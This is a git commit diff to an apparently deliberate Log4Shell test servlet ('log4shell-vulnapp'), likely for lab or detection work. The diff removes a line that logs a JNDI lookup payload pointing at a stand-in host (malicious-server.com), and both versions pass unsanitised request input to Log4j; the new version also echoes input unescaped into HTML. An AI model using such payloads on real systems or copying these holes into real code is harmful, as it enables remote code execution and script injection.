7a15380062b2696d7b1649d2f82a536160059b02
Howie Howerton <howieh@sentinelone.com>
2025-05-24 14:18:54 -0400

    push

--- log4shell-vulnapp/VulnWebApp.java
+++ log4shell-vulnapp/VulnWebApp.java
@@ -1,33 +1,17 @@
 import javax.servlet.*;
 import javax.servlet.http.*;
-import java.io.*;
+import java.io.IOException;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 
 public class VulnWebApp extends HttpServlet {
-    static {
-        // Vulnerable Log4j init
-        org.apache.logging.log4j.LogManager.getLogger(VulnWebApp.class).error("App initialized: ${jndi:ldap://malicious-server.com/a}");
-    }
+    static Logger logger = LogManager.getLogger(VulnWebApp.class);
 
-    protected void doGet(HttpServletRequest request, HttpServletResponse response)
-            throws ServletException, IOException {
-        response.setContentType("text/html");
-        PrintWriter out = response.getWriter();
-        out.println("<html><body>");
-        out.println("<h2>Log4Shell Test App</h2>");
-        out.println("<form method='POST'>");
-        out.println("Name: <input type='text' name='name'/><input type='submit' value='OK'/>");
-        out.println("</form>");
-        out.println("</body></html>");
-    }
-
-    protected void doPost(HttpServletRequest request, HttpServletResponse response)
-            throws ServletException, IOException {
+    public void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {
         String name = request.getParameter("name");
-        org.apache.logging.log4j.LogManager.getLogger(VulnWebApp.class).info("User input: " + name);
+        if (name == null) name = "world";
+        logger.info("User input: " + name);
         response.setContentType("text/html");
-        PrintWriter out = response.getWriter();
-        out.println("<html><body>");
-        out.println("<h2>Hello, " + name + "</h2>");
-        out.println("</body></html>");
+        response.getWriter().println("<html><body><form method='GET'>Name: <input name='name'/><input type='submit' value='OK'/></form><br>Hello, " + name + "</body></html>");
     }
 }
